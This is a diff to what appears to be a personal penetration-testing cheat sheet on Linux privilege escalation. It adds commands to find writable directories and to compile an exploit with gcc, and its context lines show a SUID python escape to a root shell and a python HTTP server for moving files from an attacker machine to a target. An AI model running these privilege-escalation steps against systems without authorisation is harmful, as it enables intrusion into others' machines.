@@ -49,9 +49,17 @@ If for example we find that python has SUID permissions, we can move to the pyth
 
 ```./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'```
 
+#### Find writable directories/files
+
+```find / -writable -type d 2>/dev/null ```
+
 #### Setup a python http server to download files from attacker machine to target machine.
 
 ```python -m http.server```
+
+#### Use gcc to compile a C program
+
+```gcc exploit.c -o exploit```
 
 ## Output formatting
 
